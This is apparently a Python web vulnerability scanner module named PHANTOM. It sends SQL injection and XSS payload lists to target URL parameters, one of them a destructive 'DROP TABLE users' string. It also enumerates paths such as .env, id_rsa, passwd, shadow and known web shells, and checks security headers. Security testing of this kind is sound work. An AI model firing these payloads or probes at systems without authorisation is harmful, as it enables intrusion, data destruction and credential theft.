#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHANTOM Web Security Scanner Module

Web application vulnerability scanning including
SQL injection, XSS, and other OWASP Top 10 vulnerabilities.
"""

import re
import urllib.parse
from typing import Dict, Any, List, Optional, Tuple
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


@dataclass
class Vulnerability:
    """Vulnerability finding container"""
    vuln_type: str
    severity: str
    url: str
    parameter: str
    payload: str
    evidence: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class ScanResult:
    """Scan result container"""
    target: str
    scan_type: str
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    info: Dict[str, Any] = field(default_factory=dict)
    scan_time: str = field(default_factory=lambda: datetime.now().isoformat())


class SQLiScanner:
    """SQL Injection vulnerability scanner"""
    
    PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "\" OR \"1\"=\"1",
        "1' OR '1'='1",
        "admin'--",
        "') OR ('1'='1",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL--",
        "1; DROP TABLE users--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
    ]
    
    ERROR_PATTERNS = [
        r"sql syntax",
        r"mysql_fetch",
        r"mysql_num_rows",
        r"mysqli_",
        r"pg_query",
        r"pg_exec",
        r"sqlite_",
        r"ORA-\d{5}",
        r"ODBC",
        r"DB2",
        r"Microsoft Access",
        r"SQLite",
        r"PostgreSQL",
        r"Warning:.*mysql",
        r"unclosed quotation mark",
        r"quoted string not properly terminated",
    ]
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session() if REQUESTS_AVAILABLE else None
    
    def scan(self, url: str, params: Dict[str, str] = None) -> ScanResult:
        """Scan URL for SQL injection"""
        result = ScanResult(target=url, scan_type="sqli")
        
        if not REQUESTS_AVAILABLE:
            result.info['error'] = "requests library not available"
            return result
        
        # Parse URL parameters
        parsed = urllib.parse.urlparse(url)
        query_params = dict(urllib.parse.parse_qsl(parsed.query))
        
        if params:
            query_params.update(params)
        
        if not query_params:
            result.info['warning'] = "No parameters to test"
            return result
        
        # Test each parameter
        for param in query_params:
            for payload in self.PAYLOADS:
                vuln = self._test_payload(url, param, payload, query_params)
                if vuln:
                    result.vulnerabilities.append(vuln)
                    break  # Found vulnerability for this param
        
        return result
    
    def _test_payload(self, url: str, param: str, payload: str, original_params: Dict[str, str]) -> Optional[Vulnerability]:
        """Test a single payload"""
        try:
            # Inject payload
            test_params = original_params.copy()
            test_params[param] = original_params.get(param, '') + payload
            
            response = self.session.get(url, params=test_params, timeout=self.timeout)
            
            # Check for error patterns
            for pattern in self.ERROR_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return Vulnerability(
                        vuln_type="SQL Injection",
                        severity="HIGH",
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=f"Error pattern matched: {pattern}"
                    )
        except Exception:
            pass
        
        return None


class XSSScanner:
    """Cross-Site Scripting vulnerability scanner"""
    
    PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "'><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS')\">",
        "'-alert('XSS')-'",
        "<img src=\"x\" onerror=\"alert('XSS')\">",
        "<svg/onload=alert('XSS')>",
        "<script>alert(document.domain)</script>",
    ]
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session() if REQUESTS_AVAILABLE else None
    
    def scan(self, url: str, params: Dict[str, str] = None) -> ScanResult:
        """Scan URL for XSS vulnerabilities"""
        result = ScanResult(target=url, scan_type="xss")
        
        if not REQUESTS_AVAILABLE:
            result.info['error'] = "requests library not available"
            return result
        
        # Parse URL parameters
        parsed = urllib.parse.urlparse(url)
        query_params = dict(urllib.parse.parse_qsl(parsed.query))
        
        if params:
            query_params.update(params)
        
        if not query_params:
            result.info['warning'] = "No parameters to test"
            return result
        
        # Test each parameter
        for param in query_params:
            for payload in self.PAYLOADS:
                vuln = self._test_payload(url, param, payload, query_params)
                if vuln:
                    result.vulnerabilities.append(vuln)
                    break
        
        return result
    
    def _test_payload(self, url: str, param: str, payload: str, original_params: Dict[str, str]) -> Optional[Vulnerability]:
        """Test a single XSS payload"""
        try:
            test_params = original_params.copy()
            test_params[param] = payload
            
            response = self.session.get(url, params=test_params, timeout=self.timeout)
            
            # Check if payload is reflected
            if payload in response.text:
                return Vulnerability(
                    vuln_type="Cross-Site Scripting (XSS)",
                    severity="MEDIUM",
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence="Payload reflected in response"
                )
        except Exception:
            pass
        
        return None


class DirectoryBuster:
    """Directory and file enumeration"""
    
    COMMON_DIRS = [
        'admin', 'administrator', 'wp-admin', 'login', 'wp-login.php',
        'phpmyadmin', 'pma', 'mysql', 'backend', 'dashboard',
        'api', 'v1', 'v2', 'graphql', 'rest', 'swagger',
        'backup', 'backups', 'bak', 'old', 'temp', 'tmp',
        'config', 'conf', 'configuration', 'settings',
        'uploads', 'upload', 'files', 'images', 'media',
        '.git', '.svn', '.htaccess', '.htpasswd', 'robots.txt',
        'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml',
        'test', 'testing', 'dev', 'development', 'staging',
        'wp-content', 'wp-includes', 'includes', 'lib', 'vendor',
        'cgi-bin', 'scripts', 'assets', 'static', 'public',
    ]
    
    COMMON_FILES = [
        'index.php', 'index.html', 'index.asp', 'default.asp',
        'config.php', 'config.inc.php', 'wp-config.php',
        'web.config', '.env', 'env.example', '.env.example',
        'database.yml', 'settings.py', 'config.json',
        'phpinfo.php', 'info.php', 'test.php',
        'shell.php', 'cmd.php', 'c99.php', 'r57.php',
        'id_rsa', 'id_dsa', '.ssh/id_rsa', 'shadow', 'passwd',
    ]
    
    def __init__(self, timeout: int = 5, threads: int = 10):
        self.timeout = timeout
        self.threads = threads
        self.session = requests.Session() if REQUESTS_AVAILABLE else None
    
    def scan(self, base_url: str, wordlist: List[str] = None) -> ScanResult:
        """Scan for directories and files"""
        result = ScanResult(target=base_url, scan_type="directory_bust")
        
        if not REQUESTS_AVAILABLE:
            result.info['error'] = "requests library not available"
            return result
        
        wordlist = wordlist or self.COMMON_DIRS + self.COMMON_FILES
        base_url = base_url.rstrip('/')
        
        found = []
        
        def check_path(path: str) -> Optional[Tuple[str, int]]:
            try:
                url = f"{base_url}/{path}"
                response = self.session.get(url, timeout=self.timeout, allow_redirects=False)
                if response.status_code in [200, 301, 302, 403]:
                    return (path, response.status_code)
            except Exception:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(check_path, path): path for path in wordlist}
            for future in as_completed(futures):
                result_tuple = future.result()
                if result_tuple:
                    found.append(result_tuple)
        
        result.info['found_paths'] = found
        result.info['total_checked'] = len(wordlist)
        result.info['total_found'] = len(found)
        
        return result


class HeaderAnalyzer:
    """Analyze HTTP security headers"""
    
    SECURITY_HEADERS = {
        'Strict-Transport-Security': 'HSTS - HTTP Strict Transport Security',
        'Content-Security-Policy': 'CSP - Content Security Policy',
        'X-Content-Type-Options': 'MIME type sniffing protection',
        'X-Frame-Options': 'Clickjacking protection',
        'X-XSS-Protection': 'XSS Filter',
        'Referrer-Policy': 'Referrer policy',
        'Permissions-Policy': 'Feature/Permissions policy',
        'Cross-Origin-Embedder-Policy': 'COEP',
        'Cross-Origin-Opener-Policy': 'COOP',
        'Cross-Origin-Resource-Policy': 'CORP',
    }
    
    def analyze(self, url: str) -> Dict[str, Any]:
        """Analyze security headers"""
        if not REQUESTS_AVAILABLE:
            return {'error': 'requests library not available'}
        
        try:
            response = requests.get(url, timeout=10)
            headers = dict(response.headers)
            
            analysis = {
                'url': url,
                'present': [],
                'missing': [],
                'all_headers': headers
            }
            
            for header, description in self.SECURITY_HEADERS.items():
                if header.lower() in [h.lower() for h in headers.keys()]:
                    analysis['present'].append({
                        'header': header,
                        'description': description,
                        'value': headers.get(header, '')
                    })
                else:
                    analysis['missing'].append({
                        'header': header,
                        'description': description
                    })
            
            return analysis
            
        except Exception as e:
            return {'error': str(e)}


class WebSecurityScanner:
    """
    Master Web Security Scanner Module
    
    Provides:
    - SQL Injection scanning
    - XSS detection
    - Directory enumeration
    - Security header analysis
    - Comprehensive web vulnerability assessment
    """
    
    def __init__(self):
        self.sqli_scanner = SQLiScanner()
        self.xss_scanner = XSSScanner()
        self.dir_buster = DirectoryBuster()
        self.header_analyzer = HeaderAnalyzer()
    
    def full_scan(self, url: str) -> Dict[str, ScanResult]:
        """Perform comprehensive web security scan"""
        results = {}
        
        print(f"[*] Starting full web security scan on {url}")
        
        # SQL Injection scan
        print("[*] Testing for SQL Injection...")
        results['sqli'] = self.sqli_scanner.scan(url)
        
        # XSS scan
        print("[*] Testing for Cross-Site Scripting...")
        results['xss'] = self.xss_scanner.scan(url)
        
        # Directory enumeration
        print("[*] Enumerating directories...")
        results['directories'] = self.dir_buster.scan(url)
        
        # Header analysis
        print("[*] Analyzing security headers...")
        results['headers'] = ScanResult(
            target=url,
            scan_type="headers",
            info=self.header_analyzer.analyze(url)
        )
        
        return results
    
    def quick_scan(self, url: str) -> Dict[str, Any]:
        """Quick security check"""
        return {
            'headers': self.header_analyzer.analyze(url),
            'sqli': self.sqli_scanner.scan(url)
        }
    
    def scan_sqli(self, url: str, params: Dict[str, str] = None) -> ScanResult:
        """Scan for SQL injection only"""
        return self.sqli_scanner.scan(url, params)
    
    def scan_xss(self, url: str, params: Dict[str, str] = None) -> ScanResult:
        """Scan for XSS only"""
        return self.xss_scanner.scan(url, params)
    
    def enumerate_directories(self, url: str, wordlist: List[str] = None) -> ScanResult:
        """Enumerate directories and files"""
        return self.dir_buster.scan(url, wordlist)
    
    def check_headers(self, url: str) -> Dict[str, Any]:
        """Check security headers"""
        return self.header_analyzer.analyze(url)
